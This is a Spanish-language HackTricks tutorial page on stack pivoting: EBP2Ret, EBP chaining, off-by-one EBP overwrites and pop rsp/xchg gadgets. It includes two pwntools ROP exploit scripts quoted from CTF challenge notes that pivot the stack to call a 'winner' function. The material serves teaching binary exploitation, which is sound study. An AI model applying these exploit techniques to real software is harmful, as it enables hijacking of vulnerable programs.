# Stack Pivoting - EBP2Ret - EBP chaining

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n B치sica

Esta t칠cnica explota la capacidad de manipular el **Puntero Base (EBP)** para encadenar la ejecuci칩n de m칰ltiples funciones mediante el uso cuidadoso del registro EBP y la secuencia de instrucciones `leave; ret`.

Como recordatorio, **`leave`** b치sicamente significa:
```
movl               %ebp, %esp
popl               %ebp
ret
```
Y como el **EBP est치 en la pila** antes del EIP, es posible controlarlo controlando la pila.

### EBP2Ret

Esta t칠cnica es particularmente 칰til cuando puedes **alterar el registro EBP pero no tienes una forma directa de cambiar el registro EIP**. Aprovecha el comportamiento de las funciones cuando terminan de ejecutarse.

Si, durante la ejecuci칩n de `fvuln`, logras inyectar un **EBP falso** en la pila que apunta a un 치rea en la memoria donde se encuentra la direcci칩n de tu shellcode (m치s 4 bytes para tener en cuenta la operaci칩n `pop`), puedes controlar indirectamente el EIP. Cuando `fvuln` retorna, el ESP se establece en esta ubicaci칩n manipulada, y la operaci칩n `pop` subsiguiente disminuye el ESP en 4 bytes, **haciendo que apunte efectivamente a una direcci칩n almacenada por el atacante all칤.**\
Nota c칩mo **necesitas conocer 2 direcciones**: Aquella a la que ir치 el ESP, donde necesitar치s escribir la direcci칩n a la que apunta el ESP.

#### Construcci칩n del Exploit

Primero necesitas conocer una **direcci칩n donde puedas escribir datos / direcciones arbitrarias**. El ESP apuntar치 aqu칤 y **ejecutar치 el primer `ret`**.

Luego, necesitas conocer la direcci칩n utilizada por `ret` que **ejecutar치 c칩digo arbitrario**. Podr칤as usar:

* Una direcci칩n v치lida de [**ONE\_GADGET**](https://github.com/david942j/one\_gadget).
* La direcci칩n de **`system()`** seguida de **4 bytes basura** y la direcci칩n de `"/bin/sh"` (bits x86).
* La direcci칩n de un gadget de **`jump esp;`** ([**ret2esp**](ret2esp-ret2reg.md)) seguido del **shellcode** a ejecutar.
* Alguna cadena de [**ROP**](rop-return-oriented-programing.md)

Recuerda que antes de cualquiera de estas direcciones en la parte controlada de la memoria, debe haber **`4` bytes** debido a la parte de **`pop`** de la instrucci칩n `leave`. Ser칤a posible abusar de estos 4B para establecer un **segundo EBP falso** y seguir controlando la ejecuci칩n.

#### Exploit de Desbordamiento por Uno

Existe una variante espec칤fica de esta t칠cnica conocida como un "Exploit de Desbordamiento por Uno". Se utiliza cuando solo puedes **modificar el byte menos significativo del EBP**. En tal caso, la ubicaci칩n de memoria que almacena la direcci칩n a la que saltar con el **`ret`** debe compartir los tres primeros bytes con el EBP, permitiendo una manipulaci칩n similar con condiciones m치s restringidas.

### **Cadenas de EBP**

Por lo tanto, al colocar una direcci칩n controlada en la entrada de `EBP` de la pila y una direcci칩n a `leave; ret` en `EIP`, es posible **mover el `ESP` a la direcci칩n controlada de `EBP` desde la pila**.

Ahora, el **`ESP`** est치 controlado apuntando a una direcci칩n deseada y la siguiente instrucci칩n a ejecutar es un `RET`. Para abusar de esto, es posible colocar en el lugar controlado del ESP lo siguiente:

* **`&(pr칩ximo EBP falso)`** -> Carga el nuevo EBP debido a `pop ebp` de la instrucci칩n `leave`
* **`system()`** -> Llamado por `ret`
* **`&(leave;ret)`** -> Llamado despu칠s de que system termine, mover치 ESP al EBP falso y comenzar치 de nuevo
* **`&("/bin/sh")`**-> Par치metro para `system`

B치sicamente de esta manera es posible encadenar varios EBPs falsos para controlar el flujo del programa.

Sinceramente, esto es como un [ret2lib](ret2lib/), pero m치s complejo sin un beneficio aparente, aunque podr칤a ser interesante en algunos casos excepcionales.

Adem치s, aqu칤 tienes un [**ejemplo de un desaf칤o**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) que utiliza esta t칠cnica con una **fuga de pila** para llamar a una funci칩n ganadora. Este es el payload final de la p치gina:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP es in칰til

Como se [**explica en esta publicaci칩n**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), si un binario se compila con algunas optimizaciones, el **EBP nunca llega a controlar ESP**, por lo tanto, cualquier exploit que funcione controlando EBP b치sicamente fallar치 porque no tiene ning칰n efecto real.\
Esto se debe a que el **pr칩logo y ep칤logo cambian** si el binario est치 optimizado.

* **No optimizado:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimizado:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## Otras formas de controlar RSP

### **Gadget** **`pop rsp`**

[**En esta p치gina**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) puedes encontrar un ejemplo utilizando esta t칠cnica. Para este desaf칤o fue necesario llamar a una funci칩n con 2 argumentos espec칤ficos, y hab칤a un **gadget `pop rsp`** y hay una **filtraci칩n desde la pila**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### Gadget xchg \<rag>, rsp
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## Referencias

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
